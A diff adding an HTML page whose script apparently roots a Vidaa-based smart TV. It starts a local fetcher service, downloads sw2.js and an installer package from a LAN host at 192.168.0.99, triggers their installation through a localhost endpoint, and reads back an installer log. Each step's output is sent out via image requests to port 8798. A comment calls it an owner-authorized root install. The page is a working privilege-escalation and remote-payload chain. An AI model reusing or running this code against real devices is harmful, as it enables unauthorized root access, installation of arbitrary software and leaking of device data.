@@ -1,0 +1,79 @@
+<!doctype html>
+<!-- u7s2 — OWNER-AUTHORIZED ROOT INSTALL (UR8S / MT5877):
+     1. start phoenix fetcher via wss://localhost:9888
+     2. fetchFile sw2.js  -> /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js
+     3. fetchFile installer.ipk -> /APPS/installer.ipk
+     4. XHR POST https://localhost:9888/function/basic/fetch/sw2 with
+        {list:["90:83:90;re.installer","91:82:91;/APPS/installer.ipk;re.installer;"]}
+     5. readback installer_log.txt
+     Exfil via img GET to :8798. -->
+<html><head><meta charset="utf-8"><title>u7s2</title></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7s2…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/i?d="+encodeURIComponent(String(t).slice(0,200));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+var BASE="http://192.168.0.99:8799/";
+var SW2="/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js";
+var IPK="/APPS/installer.ipk";
+
+function startFetcher(){
+  return new Promise(function(res){
+    try{
+      var ws=new WebSocket("wss://localhost:9888");
+      ws.onopen=function(){
+        ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",
+                                parameters:{},session:921,timeout:10}));
+        setTimeout(function(){try{ws.close();}catch(e){} res("fetcher start OK");},1200);
+      };
+      ws.onerror=function(){res("fetcher start WS-ERROR");};
+      setTimeout(function(){res("fetcher start TIMEOUT");},5000);
+    }catch(e){res("fetcher start EXC "+e.message);}
+  });
+}
+function fetchFile(name,target){
+  return new Promise(function(res){
+    var args=JSON.stringify({url:BASE+name,directory:target,permission:420});
+    try{
+      var r=vowOS.service.syncExecute("basic/fetcher",{api:"fetchFile",args:args});
+      res(name+" -> "+JSON.stringify(r.ret)+" "+JSON.stringify(r.msg).slice(0,80));
+    }catch(e){res(name+" EXC "+e.message);}
+  });
+}
+function trigger(){
+  return new Promise(function(res){
+    try{
+      var x=new XMLHttpRequest();
+      x.open("POST","https://localhost:9888/function/basic/fetch/sw2",false);
+      x.setRequestHeader("identifier","");
+      x.send(JSON.stringify({list:["90:83:90;re.installer","91:82:91;/APPS/installer.ipk;re.installer;"]}));
+      res("trigger -> "+String(x.responseText||"").slice(0,300));
+    }catch(e){res("trigger EXC "+e.name+":"+e.message);}
+  });
+}
+function readback(){
+  return new Promise(function(res){
+    var r=hi("fileRead",{path:["../APPS/.re_sshd/installer_log.txt"],mode:6});
+    res("installer_log ret="+r.ret+" :: "+String(r.msg||"").slice(0,300));
+  });
+}
+function portcheck(){
+  return new Promise(function(res){
+    var r=hi("fileRead",{path:["../proc/net/tcp"],mode:6});
+    var s=String(r.msg||"");
+    var m=s.split("\n").filter(function(l){return l.indexOf(":1F48")!==-1;});
+    res("tcp 8008(1F48): "+(m.length?m[0].trim().slice(0,80):"NOT LISTENING"));
+  });
+}
+setTimeout(async function(){
+  line(await startFetcher());
+  line(await fetchFile("sw2.js",SW2));
+  line(await fetchFile("installer.ipk",IPK));
+  line(await trigger());
+  line(await readback());
+  line(await portcheck());
+  line("done");
+},400);
+})();
+</script></body></html>
